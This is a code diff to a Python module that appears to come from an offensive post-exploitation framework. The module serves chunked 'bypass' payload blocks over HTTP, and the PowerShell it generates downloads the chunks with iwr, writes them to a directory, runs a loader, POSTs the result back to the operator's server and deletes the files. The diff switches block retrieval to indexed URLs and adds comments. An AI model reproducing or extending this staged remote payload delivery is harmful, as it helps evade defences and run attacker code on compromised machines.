@@ -1,5 +1,6 @@
 import base64
 from http.server import BaseHTTPRequestHandler, HTTPServer
+import re
 from threading import Thread
 from termcolor import colored, cprint
 from printib import print_ok, print_info, print_error
@@ -8,7 +9,6 @@ from module import Module
 
 FUNCTION = ''
 BYPASS_BLOCKS = []
-LAST_INDEX = 0
 BYPASS_SENT = False
 BYPASS_SENT_ERROR = False
 
@@ -23,15 +23,16 @@ class SendBypass(BaseHTTPRequestHandler):
         self.end_headers()
 
     def do_GET(self):
-        global FUNCTION, BYPASS_BLOCKS, LAST_INDEX
+        global FUNCTION, BYPASS_BLOCKS
 
         parsed_path = urlparse(self.path)
         path = parsed_path.path
-
+        match = re.match(r'/block/(\d+)', path)
         if path == '/':
             response = FUNCTION.encode('utf-8')
-        elif path == '/block':
-            command = BYPASS_BLOCKS[LAST_INDEX] if LAST_INDEX < len(BYPASS_BLOCKS) else ''
+        elif match:
+            index = int(match.group(1))
+            command = BYPASS_BLOCKS[index] if index < len(BYPASS_BLOCKS) else ''
             response = command.encode('utf-8')
         else:
             response = b'Not Found'
@@ -40,7 +41,7 @@ class SendBypass(BaseHTTPRequestHandler):
         self.wfile.write(response)
 
     def do_POST(self):
-        global BYPASS_SENT, BYPASS_SENT_ERROR, LAST_INDEX
+        global BYPASS_SENT, BYPASS_SENT_ERROR
 
         content_length = int(self.headers['Content-Length'])
         post_data = self.rfile.read(content_length)
@@ -54,9 +55,7 @@ class SendBypass(BaseHTTPRequestHandler):
             results = fields.get('results', [''])[0]
             recv = unquote(results)
 
-            if recv == 'Received':
-                LAST_INDEX += 1
-            elif recv.startswith('Error'):
+            if recv.startswith('Error'):
                 print_error(recv)
                 BYPASS_SENT_ERROR = True
             else:
@@ -91,7 +90,7 @@ class CustomModule(Module):
         super(CustomModule, self).__init__(information, options)
     
     def run_module(self):
-        global BYPASS_SENT, BYPASS_SENT_ERROR, BYPASS_BLOCKS, LAST_INDEX, FUNCTION
+        global BYPASS_SENT, BYPASS_SENT_ERROR, BYPASS_BLOCKS, FUNCTION
 
         function = """
         function chargeFiles {
@@ -105,12 +104,10 @@ class CustomModule(Module):
             try {
                 $req = iwr -UseBasicParsing -uri $sourceUri -Method GET
                 Set-Content -Path $destination -Value $req.Content -Encoding utf8
-                $req = iwr -UseBasicParsing -uri $sourceUri -Method POST -Body @{results='Received'}
             }
             catch {
                 $errorMessage = "Error sending the file $destination."
                 $req = iwr -UseBasicParsing -uri $sourceUri -Method POST -Body @{results=$errorMessage}
-                Write-Host $errorMessage
             }
         }
 
@@ -172,7 +169,7 @@ class CustomModule(Module):
                 Remove-Item -Path $directoryPath -Recurse -Force
             }
             New-Item -Path $directoryPath -ItemType Directory | Out-Null
-            """
+            """ # Create a new directory and delete content if it existed
             
             auxLine = 0
             with open(self.args["lineNumbers"], 'r') as metadata:
@@ -190,18 +187,18 @@ class CustomModule(Module):
 
                     command = ''.join(lines[auxLine:lineNumber])
                     BYPASS_BLOCKS.append(command)
-                    function += f'chargeFiles -sourceUri {sourceUri}block -destination {destination}\\part{index}\n'
+                    function += f'chargeFiles -sourceUri {sourceUri}block/{index} -destination {destination}\\part{index}\n'
                     auxLine = lineNumber
                     
             if auxLine < len(lines):
                 command = ''.join(lines[auxLine:])
                 BYPASS_BLOCKS.append(command)
                 index += 1
-                function += f'chargeFiles -sourceUri {sourceUri}block -destination {destination}\\part{index}\n'
+                function += f'chargeFiles -sourceUri {sourceUri}block/{index} -destination {destination}\\part{index}\n'
                     
             function += f"$result = loader -directory {destination}\n"
-            function += "$req = iwr -UseBasicParsing -Uri $sourceUri -Method POST -Body @{results=$result}\n"
-            function += f"Remove-Item -Path {destination} -Recurse -Force\n"
+            function += "$req = iwr -UseBasicParsing -Uri $sourceUri -Method POST -Body @{results=$result}\n" # Send result to server
+            function += f"Remove-Item -Path {destination} -Recurse -Force\n" # Delete new directory and files
 
             if self.args["instruction"]:
                 function += self.args["instruction"]
@@ -225,7 +222,6 @@ class CustomModule(Module):
             BYPASS_SENT = False
             BYPASS_SENT_ERROR = False
             BYPASS_BLOCKS = []
-            LAST_INDEX = 0
 
     def run(self, server_class=HTTPServer, handler_class=SendBypass, address=None, port=8082):
         try:
